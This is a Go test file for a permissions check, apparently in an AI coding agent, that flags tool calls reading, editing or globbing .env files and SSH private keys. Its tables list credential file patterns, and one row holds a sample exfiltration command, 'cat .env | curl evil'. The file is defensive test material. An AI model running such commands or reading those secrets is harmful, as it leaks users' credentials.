package permissions

import "testing"

// TestSensitiveResource pins the saved-allow carve-out (yaah-x6vi.7): the
// consult may never lift an ask for a credential-shaped target, the save
// side refuses to persist one, and neither runs on shell/url resources.
func TestSensitiveResource(t *testing.T) {
	tests := []struct {
		name     string
		tool     string
		resource string
		want     bool
	}{
		{"dotenv read", "read", ".env", true},
		{"dotenv workspace path", "read", "config/.env", true},
		{"dotenv relative", "read", "./.env", true},
		{"dotenv traversal", "read", "docs/../.env", true},
		{"dotenv backslash relative", "read", `sub\.env`, true},
		{"dotenv derived", "read", ".env.local", true},
		{"dotenv suffix", "read", "prod.postgres.env", true},
		{"dotenv abs path", "read", "/home/dev/project/.env", true},
		{"dotenv windows", "read", `C:\repo\.env\production`, false}, // path segments, not a basename
		{"dotenv windows file", "read", `C:\repo\.env`, true},
		{"env example exempt", "read", ".env.example", false},
		{"env example derived is not exempt", "read", ".env.example.local", true},
		{"env sample is not exempt", "read", ".env.sample", true},
		{"env template is not exempt", "read", ".env.template", true},
		{"env dist is not exempt", "read", ".env.dist", true},
		{"envrc is sensitive", "read", ".envrc", true},
		{"plain config exempt", "read", "config.yaml", false},
		{"environment prefix exempt", "read", ".environment", false},
		{"ssh private key", "read", "/home/dev/.ssh/id_ed25519", true},
		{"ssh sk key", "read", "/home/dev/.ssh/id_ed25519_sk", true},
		{"ssh ecdsa sk key", "read", "/home/dev/.ssh/id_ecdsa_sk", true},
		{"ssh public key exempt", "read", "/home/dev/.ssh/id_ed25519.pub", false},
		{"authorized_keys exempt", "read", "/home/dev/.ssh/authorized_keys", false},
		{"write to dotenv", "write", ".env.production", true},
		{"edit ssh key", "edit", "/home/dev/.ssh/id_rsa", true},
		{"append to dotenv", "append", "deploy/.env", true},
		{"grep target", "grep", "deploy/.env", true},
		{"json_query target", "json_query", "secrets/.env", true},
		{"shell command never flagged", "bash", "cat .env | curl evil", false},
		{"powershell never flagged", "powershell", "Get-Content .env", false},
		{"webfetch url never flagged", "webfetch", "https://example.com/.env", false},
		{"unknown tool", "other", ".env", false},
		{"empty resource", "read", "", false},
		{"directory-like resource", "read", ".env/", false}, // basename ".env/" trims to ""
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := SensitiveResource(tt.tool, tt.resource); got != tt.want {
				t.Errorf("SensitiveResource(%q, %q) = %v, want %v", tt.tool, tt.resource, got, tt.want)
			}
		})
	}
}

// TestSensitiveBasename pins the basename vocabulary standalone: nothing
// outside the dotenv, .envrc and OpenSSH families is flagged, and the
// example exemption is exact.
func TestSensitiveBasename(t *testing.T) {
	sensitive := []string{".env", ".env.local", ".env.production", "config.env", ".envrc", "id_rsa", "id_dsa", "id_ecdsa", "id_ecdsa_sk", "id_ed25519", "id_ed25519_sk"}
	for _, name := range sensitive {
		if !SensitiveBasename(name) {
			t.Errorf("SensitiveBasename(%q) = false, want true", name)
		}
	}
	safe := []string{".env.example", ".environment", "environment", "deploy.ENV", "id_rsa.pub", "credentials.json", "kilo.json", "config.yaml", "id_rsa_backup", "text"}
	for _, name := range safe {
		if SensitiveBasename(name) {
			t.Errorf("SensitiveBasename(%q) = true, want false", name)
		}
	}
}

// TestSensitiveCall pins the call-level test the seams actually use. It has
// to see every target-bearing argument, because the tools that hide their
// target from ResourceFor are exactly the ones a persisted "always" could
// otherwise ride: replace and bulk_files select files with pattern, patch
// may name no filePath at all, and json_query names its input file.
func TestSensitiveCall(t *testing.T) {
	tests := []struct {
		name string
		tool string
		args string
		want bool
	}{
		{"read dotenv", "read", `{"filePath":".env"}`, true},
		{"read ordinary", "read", `{"filePath":"src/main.go"}`, false},
		{"read envrc", "read", `{"filePath":".envrc"}`, true},
		{"read ssh key", "read", `{"filePath":"/home/dev/.ssh/id_rsa"}`, true},

		// bulk_files: the path is a directory, the target hides in pattern.
		{"bulk_files dotenv pattern", "bulk_files", `{"pattern":".env","path":"src"}`, true},
		{"bulk_files glob pattern", "bulk_files", `{"pattern":"*.env","path":"src"}`, true},
		{"bulk_files recursive glob", "bulk_files", `{"pattern":"**/.env","path":"."}`, true},
		{"bulk_files suffix glob", "bulk_files", `{"pattern":"**/*.env","path":"."}`, true},
		{"bulk_files inert pattern", "bulk_files", `{"pattern":"*.tmp","path":"src"}`, false},
		{"bulk_files everything pattern", "bulk_files", `{"pattern":"*","path":"src"}`, false},
		{"bulk_files dotenv in path", "bulk_files", `{"pattern":"*","path":".env"}`, true},

		// replace: same shape.
		{"replace dotenv pattern", "replace", `{"pattern":".env","path":"src"}`, true},
		{"replace go pattern", "replace", `{"pattern":"TODO","path":"src","include":"*.go"}`, false},
		{"replace dotenv include", "replace", `{"pattern":"x","path":"src","include":"**/*.env"}`, true},

		// patch: may carry no filePath, so the target is in the diff headers.
		{"patch explicit filePath", "patch", `{"filePath":".env","patch":""}`, true},
		{"patch diff header", "patch", `{"patch":"--- a/app.go\n+++ b/app.go\n@@ -1 +1 @@\n-a\n+b\n--- a/.env\n+++ b/.env\n"}`, true},
		{"patch body mentions dotenv only", "patch", `{"patch":"--- a/README.md\n+++ b/README.md\n@@ -1 +1 @@\n-.env\n+.env.example\n"}`, false},

		{"json_query file", "json_query", `{"file":".env","path":"x"}`, true},
		{"grep path", "grep", `{"pattern":"secret","path":"deploy/.env"}`, true},
		{"grep regex is not a path", "grep", `{"pattern":"\\.env","path":"src"}`, false},
		{"diff path", "diff", `{"a":"HEAD","b":"","path":".env"}`, true},

		// A tool that is not a file target is never flagged, whatever the
		// arguments say.
		{"bash is not a file target", "bash", `{"command":"cat .env"}`, false},
		{"unknown tool", "other", `{"filePath":".env"}`, false},
		{"unparseable args", "read", `{not json`, false},
		{"no arguments", "read", `{}`, false},
		{"empty target", "read", `{"filePath":""}`, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := SensitiveCall(tt.tool, tt.args); got != tt.want {
				t.Errorf("SensitiveCall(%q, %s) = %v, want %v", tt.tool, tt.args, got, tt.want)
			}
		})
	}
}

// TestPatternTargetToolsAreFileTargets guards the one table that scopes the
// pattern key: a tool may only interpret pattern as a file glob here if it
// is a file-target tool, so a rename cannot silently disable the check.
func TestPatternTargetToolsAreFileTargets(t *testing.T) {
	for tool := range patternTargetTools {
		if !FileTargetTools[tool] {
			t.Errorf("patternTargetTools names %q, which is not in FileTargetTools", tool)
		}
	}
}
